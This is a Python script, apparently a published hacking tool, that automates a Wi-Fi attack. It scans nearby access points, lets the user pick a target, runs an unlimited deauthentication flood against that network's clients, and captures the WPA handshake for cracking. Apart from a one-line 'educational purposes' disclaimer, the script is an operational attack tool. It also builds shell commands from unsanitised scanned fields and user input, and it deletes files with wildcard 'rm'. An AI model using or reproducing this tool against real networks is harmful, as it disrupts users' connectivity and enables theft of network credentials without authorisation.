  
#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.

# We will be using the subprocess module to run commands on Kali Linux.
import subprocess
# We will require regular expressions.
import re
# We want to open the CSV files generated by airmon-ng, and we'll use the built-in csv module.
import csv
# We want to import os because we want to check for sudo
import os
# We want to use time.sleep()
import time
# We want to check that after enabling monitor mode our interface name is changed or not
import glob
# To Change Title Color
from termcolor import colored

# We declare an empty list where all active wireless networks will be saved to.
active_wireless_networks = []

# We use this function to test if the ESSID is already in the list file. 
# If so we return False so we don't add it again.
# If it is not in the lst we return True which will instruct the elif 
# statement to add it to the lst.
def check_for_essid(essid, lst):
    check_status = True

    # If no ESSIDs in list add the row
    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in lst:
        # If True don't add to list. False will add it to list
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Basic user interface header
title = (r"""
  /$$$$$$  /$$                  /$$$$$$              /$$               /$$      
 /$$__  $$|__/                 /$$__  $$            | $$              | $$      
| $$  \ $$ /$$  /$$$$$$       | $$  \__/  /$$$$$$  /$$$$$$    /$$$$$$$| $$$$$$$ 
| $$$$$$$$| $$ /$$__  $$      | $$       |____  $$|_  $$_/   /$$_____/| $$__  $$
| $$__  $$| $$| $$  \__/      | $$        /$$$$$$$  | $$    | $$      | $$  \ $$
| $$  | $$| $$| $$            | $$    $$ /$$__  $$  | $$ /$$| $$      | $$  | $$
| $$  | $$| $$| $$            |  $$$$$$/|  $$$$$$$  |  $$$$/|  $$$$$$$| $$  | $$
|__/  |__/|__/|__/             \______/  \_______/   \___/   \_______/|__/  |__/

                by XBEAST ~ Embrace the power, command the networks!
                                    v1.4
                    Github Link: https://github.com/XBEAST1""")

colored_text = colored(title, 'magenta')
print(colored_text)

# If the user doesn't run the program with super user privileges, don't allow them to continue.
print ()
if not 'SUDO_UID' in os.environ.keys():
    print("Run this script with sudo.")
    exit()

# Remove all existing .csv files in the directory.
os.system ('screen -d -m rm *.csv')

# Regex to find wireless interfaces, we're making the assumption they will all be wlan0 or higher.
wlan_pattern = re.compile("wlan[0-9]")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No WiFi Adapter connected.
if len(check_wifi_result) == 0:
    print("Please connect a WiFi controller and try again.")
    exit()

# Menu to select WiFi interface from
print("The following WiFi interfaces are available:\n")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input("\nPlease select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices.")

# For easy reference we call the picked interface iface
iface = check_wifi_result[int(wifi_interface_choice)]

# Kill conflicting WiFi processses
print("WiFi adapter connected!\nNow let's kill conflicting processes:")

# Killing all conflicting processes using airmon-ng
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless interface in Monitored mode
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", iface])

# Check if the selected interface name changed to wlan*mon after enabling monitor mode
check_iface = glob.glob('/sys/class/net/wlan*mon')

if check_iface:
    # Get the first matching interface
    iface = os.path.basename(check_iface[0])

# Discover access points
discover_access_points = os.system("screen -d -m sudo airodump-ng -w file --write-interval 1 --output-format csv" + ' ' + iface)

# Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
try:
    while True:
        # We want to clear the screen before we print the network interfaces.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                # The following list contains the field names for the csv entries.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tPower |\tESSID                         |")
        print("___|\t___________________|\t______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['Power'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before loading the updated list.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nPlease Select The Target You Want To Attack.")

# Ensure that the input choice is valid.
while True:
    choice = input("Your Option: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

os.system ('rm *.csv')
targetbssid = active_wireless_networks[int(choice)]["BSSID"]
targetchannel = active_wireless_networks[int(choice)]["channel"].strip()
handshake = input("Please Enter Target Hanshake Name : ")

os.system ('killall screen')
os.system ('screen -d -m airmon-ng start ' + iface + ' ' + targetchannel)
subprocess.Popen(['xterm', '-e', 'aireplay-ng --deauth 0 -a ' + targetbssid + ' ' + iface])
os.system ('airodump-ng -w ' + handshake + ' -c ' + targetchannel + ' --bssid ' + targetbssid  + ' ' + iface)
os.system ('screen -d -m rm *.csv')
os.system ('screen -d -m rm *.kismet.netxml')
os.system ('screen -d -m airmon-ng stop ' + iface)
os.system ('screen -d -m service NetworkManager restart')
